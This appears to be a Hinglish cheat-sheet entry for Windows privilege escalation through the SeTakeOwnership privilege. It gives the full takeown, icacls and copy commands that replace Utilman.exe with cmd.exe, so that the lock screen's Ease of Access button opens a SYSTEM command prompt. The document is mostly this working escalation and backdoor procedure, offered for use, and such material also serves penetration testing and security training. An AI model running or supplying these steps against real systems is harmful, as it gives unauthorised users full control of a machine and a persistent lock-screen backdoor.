### SeTakeOwnership — File Ownership Abuse

**Concept:**  
Kisi bhi file ka ownership le sako — phir usse apne hisaab se modify karo. Classic trick — `utilman.exe` (lock screen accessibility button) ko `cmd.exe` se replace karo → lock screen pe SYSTEM shell.

**Vulnerability:** SYSTEM se chalne wali koi bhi exe replace kar do → SYSTEM shell.

**Commands:**

cmd

```cmd
# File ka ownership lo
takeown /f C:\Windows\System32\Utilman.exe

# Full permissions apne aap ko do
icacls C:\Windows\System32\Utilman.exe /grant username:F

# cmd.exe se replace karo
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

Phir lock screen → Ease of Access button click → SYSTEM cmd.